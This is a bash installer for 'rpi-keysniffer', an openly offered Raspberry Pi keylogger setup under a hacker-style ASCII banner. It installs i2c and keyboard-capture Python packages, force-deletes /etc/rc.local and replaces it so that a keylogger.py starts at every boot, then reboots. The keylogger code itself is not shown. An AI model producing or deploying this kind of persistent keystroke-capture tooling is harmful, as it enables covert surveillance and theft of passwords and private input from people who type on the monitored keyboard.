#!/bin/bash -e
clear
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color
answer=False

function requirements() {
  apt update
  apt install python3-pip i2c-tools
  sudo python3 -m pip install smbus
  sudo python3 -m pip install keyboard
  sudo raspi-config
}

echo -e "${RED}
██╗░░██╗██████╗░██╗░░░░░░█████╗░██╗░░░██╗████████╗░░██╗██╗░█████╗░░░██╗██╗
╚██╗██╔╝██╔══██╗██║░░░░░██╔══██╗╚██╗░██╔╝╚══██╔══╝░██╔╝██║██╔══██╗░██╔╝██║
░╚███╔╝░██████╔╝██║░░░░░██║░░██║░╚████╔╝░░░░██║░░░██╔╝░██║██║░░██║██╔╝░██║
░██╔██╗░██╔═══╝░██║░░░░░██║░░██║░░╚██╔╝░░░░░██║░░░███████║██║░░██║███████║
██╔╝╚██╗██║░░░░░███████╗╚█████╔╝░░░██║░░░░░░██║░░░╚════██║╚█████╔╝╚════██║
╚═╝░░╚═╝╚═╝░░░░░╚══════╝░╚════╝░░░░╚═╝░░░░░░╚═╝░░░░░░░░╚═╝░╚════╝░░░░░░╚═╝"
echo -e "${BLUE}╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╮╭━╮
╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭╯┃╭╯
╭━┳━━┳╮╱╱┃┃╭┳━━┳╮╱╭┳━━┳━╮╭┳╯╰┳╯╰┳━━┳━╮
┃╭┫╭╮┣╋━━┫╰╯┫┃━┫┃╱┃┃━━┫╭╮╋╋╮╭┻╮╭┫┃━┫╭╯
┃┃┃╰╯┃┣━━┫╭╮┫┃━┫╰━╯┣━━┃┃┃┃┃┃┃╱┃┃┃┃━┫┃
╰╯┃╭━┻╯╱╱╰╯╰┻━━┻━╮╭┻━━┻╯╰┻╯╰╯╱╰╯╰━━┻╯
╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╰╯╱╱╱╱╱╱╱╱╱╱╱╰━━╯"
echo -e "${NC}\nWelcome to the rpi-keysniffer, press ENTER to continue."
read
echo -e "++++ necessary packets will be installed ++++"

while [[ $answer = False ]]; do
read -p "Do you agree? [Y/n]: " YorN
if [[ $YorN = 'Y' ]];         #user agreed
then
  requirements
  answer=True                 #add modules
  sudo rm -rf /etc/rc.local        #replace rc.local
  sudo cp rc.local /etc/rc.local
  sudo reboot
elif [[ $YorN = 'n' ]];       #user didnt agree
then
  answer=True
  echo "You will have to add the /path/to/your/keylogger.py to /etc/rc.local manually."
  echo "reboot afterwards"
else                         #user didnt answer anything
  echo -e "\nPlease enter 'Y' or 'n'"
fi
done
